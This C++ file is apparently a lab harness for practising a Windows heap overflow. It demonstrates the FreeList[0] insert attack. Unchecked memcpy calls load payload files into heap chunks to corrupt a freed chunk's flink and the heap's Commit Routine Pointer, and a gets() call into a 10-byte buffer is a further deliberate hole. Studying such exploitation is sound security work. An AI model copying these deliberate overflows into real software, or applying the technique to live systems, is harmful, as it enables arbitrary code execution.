// HeapOverflowsFreeList0InsertAttack.cpp : Defines the entry point for the console application.
//
#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <iostream>
#include <cstdio>
#define SIZE 10000

int get_file_size(char* filename) // path to file
{
    FILE *p_file = NULL;
    p_file = fopen(filename,"rb");
    fseek(p_file,0,SEEK_END);
    int size = ftell(p_file);
    fclose(p_file);
    return size;
}

int main(int argc,char *argv[])
{
	FILE* file = fopen("exploit.bin", "rb");
	unsigned char buffer[SIZE];
	int SIZE_2 = get_file_size("exploit.bin");
	printf("[*] Size of payload: %d\n", SIZE_2);

	if (file) {
		while (!feof(file)) {
			fread(buffer, 1, SIZE_2, file);
		}
	}

    HLOCAL a,b,c,d,e;
    HANDLE hHeap;

	char buf[10];
	gets(buf);

    hHeap = HeapCreate(0x00040000,0,0);
    printf ("hHeap == 0x%p\n", hHeap);

    a = HeapAlloc(hHeap,0x00000008,0x300);
    b = HeapAlloc(hHeap,0x00000008,0x500); // bf8
	c = HeapAlloc(hHeap,0x00000008,0x1000);
    printf ("Allocated:\n  a == 0x%p\n  b == 0x%p\n  c == 0x%p\n",a,b,c); 

	//__asm { int 0x3 };
	//HeapFree(hHeap, 0, a);
    //HeapFree(hHeap, 0, b);
	//HeapFree(hHeap, 0, c);

	__asm { int 0x3 };
	HeapFree(hHeap, 0, b);

    //char str1[0x1000];
	//gets(str1);
    //memcpy (a, str1, strlen(str1));  // corrupt b and make b flink point to another portion of the heap 360180 would be ok
	memcpy (a, buffer, SIZE_2);

	//HeapFree(hHeap, 0, c); // here list <-> b <-> c <-> list

    // Pop valid chunk from the list
    e = HeapAlloc(hHeap,0x00000008,0xbf8); // c is big enough but b cannot make it, so it will look at b's flink which should be at 360180
	printf ("Allocated:\n  e == 0x%p\n", e); 

	//gets(str1);
	//memcpy (e, str1, strlen(str1));
	FILE* file1 = fopen("exploit_2.bin", "rb");
	int SIZE_3 = get_file_size("exploit_2.bin");
	printf("[*] Size of second payload: %d\n", SIZE_3);

	if (file1) {
		while (!feof(file1)) {
			fread(buffer, 1, SIZE_3, file1);
		}
	}
	memcpy (e, buffer, SIZE_3);
	d = HeapAlloc(hHeap,0x00000008,0x2000); // cause the Commit Routine Pointer +57c to corrupt
}

